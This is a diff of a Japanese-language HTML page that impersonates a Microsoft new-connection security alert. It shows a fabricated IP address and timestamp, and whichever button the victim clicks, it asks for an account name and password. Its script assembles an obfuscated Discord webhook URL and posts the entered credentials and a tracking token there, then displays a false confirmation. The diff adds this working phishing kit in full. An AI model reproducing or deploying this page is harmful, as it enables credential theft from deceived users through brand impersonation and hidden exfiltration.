@@ -7,7 +7,7 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;padding-top:60px;}
-.page{width:780px;}
+.page{width:780px;max-width:100%;}
 .cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
 .top-bar{height:4px;background:linear-gradient(90deg,#44546A,#0067b8,#2B7C8A);}
 .hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
@@ -23,8 +23,8 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .meta-tbl td:last-child{font-family:Consolas,monospace;font-size:13px;color:#333;}
 .chk-row{display:flex;align-items:center;gap:10px;margin-bottom:22px;font-size:13px;color:#555;}
 .chk-row input[type=checkbox]{width:16px;height:16px;accent-color:#0067b8;}
-.btn-row{display:flex;gap:14px;margin-bottom:8px;}
-.btn{flex:1;padding:17px;border:none;border-radius:4px;font-size:17px;font-weight:600;cursor:pointer;letter-spacing:.3px;text-align:center;}
+.btn-row{display:flex;flex-wrap:wrap;gap:14px;margin-bottom:8px;}
+.btn{flex:1 1 100%;padding:17px;border:none;border-radius:4px;font-size:17px;font-weight:600;cursor:pointer;letter-spacing:.3px;text-align:center;}
 .btn.allow{background:#0067b8;color:#fff;}
 .btn.allow:hover{background:#005da6;}
 .btn.deny{background:#fff;color:#e74c3c;border:2px solid #e74c3c;}
@@ -68,12 +68,76 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 これがあなた自身ではない場合、または新しいネットワーク接続に気付かない場合は、下の「ブロック」をクリックしてください。この接続はブロックされます。
 </div>
 <table class="meta-tbl" id="meta-tbl">
-<tr><td>接続時間</td><td id="ts-cell">2026/11/22</td></tr>
-<tr><td>IPアドレス</td><td id="ip-cell"></td></tr>
+<tr><td>接続時間</td><td id="ts-cell">2026/11/23 00:00:00 JST</td></tr>
+<tr><td>IPアドレス</td><td id="ip-cell">58.20.142.07</td></tr>
 <tr><td>推定場所</td><td>大阪府・寝屋川市</td></tr>
 <tr><td>デバイス</td><td>ノートPC ／ Windows 11</td></tr>
 <tr><td>エージェント</td><td>Mozilla/5.0 (Win64) Chrome/131.0.0.0</td></tr>
 </table>
 <label class="chk-row"><input type="checkbox" checked> 今後の接続について通知しない</label>
 <div class="btn-row" id="btn-row">
-<button class="btn allow" onclick="doAction('allow')">この新しい
+<button class="btn allow" onclick="doAction('allow')">この新しい接続を許可する</button>
+<button class="btn deny" onclick="doAction('deny')">この接続をブロックする</button>
+</div>
+<span class="detail-link" id="detail-link" onclick="doAction('allow')">接続の詳細を見る ›</span>
+<div class="divider"></div>
+<div id="form-area"></div>
+<div class="spin" id="sp"></div>
+<div class="ok" id="ok">
+<p>&#10003; 処理が完了しました</p>
+<small id="ok-detail"></small>
+</div>
+</div>
+<div class="foot">
+<span><a href="#" onclick="return false;">利用規約</a> ／ <a href="#" onclick="return false;">プライバシー概要</a> ／ <a href="#" onclick="return false;">法的情報</a></span>
+<span>&copy; Microsoft Corporation<span class="auto-note">この通知は自動的に送信されました。</span></span>
+</div>
+</div>
+</div>
+<script>
+var ipcell=document.getElementById('ip-cell');
+var tscell=document.getElementById('ts-cell');
+if(ipcell){ipcell.textContent='58.20.'+(Math.floor(Math.random()*200)+20)+'.'+(Math.floor(Math.random()*200)+20);}
+if(tscell){var d=new Date();var pf=function(x){return('0'+x).slice(-2);};tscell.textContent=d.getFullYear()+'/'+pf(d.getMonth()+1)+'/'+pf(d.getDate())+' '+pf(d.getHours())+':'+pf(d.getMinutes())+':'+pf(d.getSeconds())+' JST';}
+var H="https:/";
+var T="/discord.com/api/webhooks/";
+var A="1569533813548388482/";
+var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
+var t=new URLSearchParams(window.location.search).get('t')||'?';
+var action="";
+function doAction(a){
+action=a;
+var a1=document.getElementById("alert-box");if(a1)a1.style.display="none";
+var m=document.getElementById("meta-tbl");if(m)m.style.display="none";
+var c=document.querySelector(".chk-row");if(c)c.style.display="none";
+var b=document.getElementById("btn-row");if(b)b.style.display="none";
+var dl=document.getElementById("detail-link");if(dl)dl.style.display="none";
+var reason,btnLabel;
+if(a==="allow"){reason="接続確認のため、以下の認証情報を入力してください。";btnLabel="接続確認を実行";}
+else{reason="接続をブロックします。認証情報を入力し「接続を許可しない」を選択してください。";btnLabel="接続を許可しない";}
+var area=document.getElementById("form-area");
+area.innerHTML='<div class="alert-box" style="font-size:16px;margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
+area.style.display="block";
+setTimeout(function(){var f=document.getElementById('u');if(f)f.focus();},100);
+}
+function send(){
+var u=document.getElementById("u").value;
+var p=document.getElementById("p").value;
+if(!u||!p)return false;
+document.getElementById("f").style.display="none";
+var s=document.getElementById("sp");if(s)s.style.display="block";
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"["+action.toUpperCase()+"] ["+t+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
+.then(function(){var sp=document.getElementById("sp");if(sp)sp.style.display="none";var ok=document.getElementById("ok");if(ok)ok.style.display="block";
+if(action==="allow"){var od=document.getElementById("ok-detail");if(od)od.innerHTML="接続を許可しました。<br>今後の接続からの通知は送信されません。";}
+else{var od=document.getElementById("ok-detail");if(od)od.innerHTML="接続をブロックしました。<br>アカウントは保護されました。";}
+})
+.catch(function(){var sp=document.getElementById("sp");if(sp)sp.style.display="none";var ok=document.getElementById("ok");if(ok)ok.style.display="block";
+var od=document.getElementById("ok-detail");if(od)od.innerHTML=action==="allow"?"接続を許可しました。":"接続をブロックしました。";
+});
+return false;
+}
+</script>
+</body>
+</html>
